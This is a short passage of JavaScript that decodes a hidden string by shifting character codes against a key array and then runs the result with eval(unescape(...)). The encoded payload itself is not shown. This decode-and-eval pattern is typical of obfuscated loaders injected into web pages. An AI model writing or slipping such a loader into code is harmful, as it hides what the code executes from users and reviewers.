		for (var i = 0; i < smat.length; i += 10) {
			for (var k = 0; k <= 9; k++) {
				if ((k + i) < smat.length) {
					t += String.fromCharCode(smat.charCodeAt(i + k) - p[k]);
				}
			}
		}
		eval(unescape(t));
	})();